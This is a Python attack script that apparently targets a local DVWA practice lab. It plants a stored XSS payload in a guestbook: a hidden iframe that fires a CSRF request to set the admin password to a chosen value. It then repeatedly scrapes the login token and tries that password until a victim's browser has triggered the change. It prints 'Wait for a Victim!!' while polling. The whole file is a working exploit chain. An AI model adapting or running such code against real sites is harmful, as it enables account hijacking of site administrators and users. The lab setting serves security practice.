import requests
from bs4 import BeautifulSoup as bs
import sys
from time import sleep

def iframe_inject(password):
    data = {
            "txtName":"test",
            "mtxMessage":"<iframe src='http://10.0.2.13:8080/vulnerabilities/csrf?password_new="+password+"&password_conf="+password+"&Change=Change#' width=0 height=0>",
            "btnSign":"Sign+Guestbook"
            }
    URL="http://10.0.2.13:8080/vulnerabilities/xss_s/"
    headers = {"Referer":URL,"Content-Type":"application/x-www-form-urlencoded"}
    clear = session1.post(URL,headers=headers,cookies=cookie,data="txtName=&mtxMessage=&btnClear=Clear+Guestbook")
    req = session1.post(URL,cookies=cookie,data=data)

def login(password):
    account={
            "username":"admin",
            "password":password,
            "Login":"Login"
            }
    URL="http://10.0.2.13:8080/login.php"
    while(1):
        token = session2.get(URL,cookies=cookie)
        login_html = token.text
        html_parser = bs(login_html,'html.parser')
        user_token = html_parser.find('input',{'name':'user_token'})
        login_data = {**account, **{'user_token':user_token['value']}}
        login = session2.post(URL,cookies=cookie,data=login_data)
        if(login.text.find("login_logo.png")==-1):
            print("\n\n")
            print("Crack Success!!"+str("admin")+"/"+str(password))
            print("\n\n")
            exit(0)
        else:
            print("\n\n")
            print("Wait for a Victim!!")
            print("\n\n")
            sleep(20)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} <new password>".format(sys.argv[0]))
        exit(0)
    else:
        session1=requests.Session()
        session2=requests.Session()
        cookie={
                "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
                "security":"low"
                }

iframe_inject(sys.argv[1])
login(sys.argv[1])
